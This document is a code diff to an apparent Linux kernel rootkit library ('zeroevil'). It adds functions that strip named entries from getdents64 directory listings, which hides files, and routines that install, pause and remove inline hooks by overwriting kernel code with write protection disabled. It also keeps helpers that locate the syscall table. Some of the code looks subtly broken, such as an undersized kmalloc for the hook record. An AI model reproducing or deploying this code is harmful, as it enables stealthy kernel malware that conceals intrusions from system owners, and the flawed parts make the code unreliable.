@@ -25,6 +25,8 @@
 # include <linux/slab.h>
 // __NR_close.
 # include <linux/syscalls.h>
+// struct linux_dirent64.
+# include <linux/dirent.h>
 # endif // CPP
 
 # include "zeroevil.h"
@@ -92,8 +94,10 @@ print_process_list(void)
     char *buff;
     struct task_struct *task;
 
+    // TODO: Use another size?
     buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
     if (!buff) {
+        fm_alert("%s\n", "kmalloc failed.");
         return;
     }
 
@@ -122,8 +126,10 @@ print_module_list(void)
     char *buff;
     struct module *mod;
 
+    // TODO: Use another size?
     buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
     if (!buff) {
+        fm_alert("%s\n", "kmalloc failed.");
         return;
     }
 
@@ -139,16 +145,17 @@ print_module_list(void)
 }
 
 
-// TODO: print_dirent64.
 void
-print_dirent(struct linux_dirent *dirp, long total)
+print_dents(struct linux_dirent *dirp, long total)
 {
     char *buff;
     long index;
     struct linux_dirent *cur;
 
+    // TODO: Use another size?
     buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
     if (!buff) {
+        fm_alert("%s\n", "kmalloc failed.");
         return;
     }
 
@@ -169,10 +176,39 @@ print_dirent(struct linux_dirent *dirp, long total)
 }
 
 
-// TODO: remove_dirent64_entry.
+void
+print_dents64(struct linux_dirent64 *dirp, long total)
+{
+    char *buff;
+    long index;
+    struct linux_dirent64 *cur;
+
+    // TODO: Use another size?
+    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
+    if (!buff) {
+        fm_alert("%s\n", "kmalloc failed.");
+        return;
+    }
+
+    strlcpy(buff, dirp->d_name, PAGE_SIZE);
+    index = dirp->d_reclen;
+    cur = (struct linux_dirent64 *)((unsigned long)dirp + index);
+    while (index < total) {
+        strlcat(buff, " ", PAGE_SIZE);
+        strlcat(buff, cur->d_name, PAGE_SIZE);
+        index += cur->d_reclen;
+        cur = (struct linux_dirent64 *)((unsigned long)dirp + index);
+    }
+
+    fm_alert("%s\n", buff);
+    kfree(buff);
+
+    return;
+}
+
+
 long
-remove_dirent_entry(char *name,
-                    struct linux_dirent *dirp, long total)
+remove_dent(char *name, struct linux_dirent *dirp, long total)
 {
     struct linux_dirent *cur = dirp;
     long index = 0;
@@ -193,6 +229,31 @@ remove_dirent_entry(char *name,
     return total;
 }
 
+
+long
+remove_dent64(char *name, struct linux_dirent64 *dirp, long total)
+{
+    struct linux_dirent64 *cur = dirp;
+    long index = 0;
+
+    while (index < total) {
+        if (strncmp(cur->d_name, name, strlen(name)) == 0) {
+            unsigned long next = (unsigned long)cur + cur->d_reclen;
+            long rest = (unsigned long)dirp + total - next;
+            long reclen = cur->d_reclen;
+            fm_alert("Hiding: %s\n", cur->d_name);
+            memmove(cur, (void *)next, rest);
+            total -= reclen;
+        }
+        index += cur->d_reclen;
+        cur = (struct linux_dirent64 *)((unsigned long)dirp + index);
+    }
+
+    return total;
+}
+
+
+# if defined(__x86_64__)
 
 void *
 get_lstar_sct_addr(void)
@@ -252,10 +313,130 @@ set_lstar_sct(u32 address)
 
 
 // INFO: See also phys_to_virt.
+extern unsigned long phys_base;
+
 void *
 phys_to_virt_kern(phys_addr_t address)
 {
     return (void *)(address - phys_base + __START_KERNEL_map);
+}
+
+# endif // defined(__x86_64__)
+
+
+static LIST_HEAD(hooked_list);
+
+void
+install_inline_hook(void *real_addr, void *fake_addr)
+{
+    unsigned long addr;
+    struct hooked_item *item;
+
+    fm_alert("HOOKED_SIZE: %zu\n", HOOKED_SIZE);
+
+    item = kmalloc(sizeof item, GFP_KERNEL);
+    if (!item) {
+        fm_alert("%s\n", "kmalloc failed.");
+        return; // TODO: Do something?
+    }
+
+    // Fill the struct with initial values.
+    item->real_addr = real_addr;
+    memcpy(item->real_opcode, real_addr, HOOKED_SIZE);
+    memcpy(item->fake_opcode, BYTES, HOOKED_SIZE);
+    print_memory(item->fake_opcode, HOOKED_SIZE, "BYTES");
+
+    // Display the original opcode.
+    fm_alert("real_addr: %p fake_addr: %p\n", real_addr, fake_addr);
+    print_memory(item->real_opcode, HOOKED_SIZE, "real_opcode");
+
+    // Prepare and display the faked opcode.
+    addr = (unsigned long)fake_addr;
+    memcpy(item->fake_opcode + DELTA, &addr, sizeof addr);
+    print_memory(item->fake_opcode, HOOKED_SIZE, "fake_opcode");
+
+    print_memory(real_addr, HOOKED_SIZE, "--> Before hooking");
+    // Modify the original opcode.
+    preempt_disable();
+    disable_wp();
+    memcpy(real_addr, item->fake_opcode, HOOKED_SIZE);
+    enable_wp();
+    preempt_enable();
+    print_memory(real_addr, HOOKED_SIZE, "--> After hooking");
+
+    // Bookkeep the hooking record.
+    list_add(&(item->list), &hooked_list);
+
+    return;
+}
+
+
+void
+pause_inline_hook(void *real_addr)
+{
+    struct hooked_item *item;
+
+    list_for_each_entry (item, &hooked_list, list) {
+        if (item->real_addr == real_addr) {
+            // Restore the entry to its original opcode.
+            preempt_disable();
+            disable_wp();
+            memcpy(item->real_addr, item->real_opcode, HOOKED_SIZE);
+            enable_wp();
+            preempt_enable();
+        }
+    }
+
+    return;
+}
+
+
+void
+resume_inline_hook(void *real_addr)
+{
+    struct hooked_item *item;
+
+    list_for_each_entry (item, &hooked_list, list) {
+        if (item->real_addr == real_addr) {
+            // Change the entry opcode to the faked one.
+            preempt_disable();
+            disable_wp();
+            memcpy(item->real_addr, item->fake_opcode, HOOKED_SIZE);
+            enable_wp();
+            preempt_enable();
+        }
+    }
+
+    return;
+}
+
+
+void
+remove_inline_hook(void *real_addr)
+{
+    struct hooked_item *item;
+
+    list_for_each_entry (item, &hooked_list, list) {
+        if (item->real_addr == real_addr) {
+            // Restore the entry to its original opcode.
+            print_memory(real_addr, HOOKED_SIZE,
+                         "--> Before removing");
+            preempt_disable();
+            disable_wp();
+            memcpy(item->real_addr, item->real_opcode, HOOKED_SIZE);
+            enable_wp();
+            preempt_enable();
+            print_memory(real_addr, HOOKED_SIZE,
+                         "--> After removing");
+
+            // Remove this record and free resources.
+            list_del(&(item->list));
+            kfree(item);
+            break;
+        }
+    }
+
+    return;
 }
 
 
